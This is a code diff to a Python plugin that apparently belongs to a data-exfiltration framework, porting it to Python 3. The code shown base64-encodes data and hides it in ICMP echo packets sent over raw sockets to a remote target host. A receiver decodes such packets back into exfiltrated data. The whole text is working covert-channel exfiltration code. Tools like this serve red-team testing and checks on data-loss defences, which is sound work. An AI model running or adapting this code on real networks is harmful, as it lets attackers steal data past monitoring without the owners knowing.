@@ -2,6 +2,8 @@ import base64
 import socket
 from random import choice, randint
 from dpkt import ip, icmp
+import traceback
+import sys
 
 config = None
 app_exfiltrate = None
@@ -9,20 +11,22 @@ app_exfiltrate = None
 def send_icmp(dst, data):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-    except:
+    except Exception:
+        traceback.print_exc()
         app_exfiltrate.log_message('warning', "ICMP plugin requires root privileges")
         sys.exit()
     ip_dst = socket.gethostbyname(dst)
     echo = icmp.ICMP.Echo()
     echo.id = randint(0, 0xffff)
     echo.seq = 1
-    echo.data = data
+    echo.data = data.encode()
     icmp_pkt = icmp.ICMP()
     icmp_pkt.type = icmp.ICMP_ECHO
     icmp_pkt.data = echo
     try:
         s.sendto(icmp_pkt.pack(), (ip_dst, 0))
-    except:
+    except Exception:
+        traceback.print_exc()
         app_exfiltrate.log_message('warning', "ICMP plugin requires root privileges")
         pass
     s.close()
@@ -33,7 +37,7 @@ def send(data):
         target = choice(targets)
     else:
         target = config['target']
-    data = base64.b64encode(data)
+    data = base64.b64encode(data.encode()).decode()
     app_exfiltrate.log_message(
         'info', "[icmp] Sending {0} bytes with ICMP packet to {1}".format(len(data), target))
     send_icmp(target, data)
@@ -65,7 +69,7 @@ def analyze(payload, src, dst):
     try:
         app_exfiltrate.log_message(
             'info', "[icmp] Received ICMP packet from {0} to {1}".format(src, dst))
-        app_exfiltrate.retrieve_data(base64.b64decode(payload))
+        app_exfiltrate.retrieve_data(base64.b64decode(payload).decode())
     except:
         pass
 
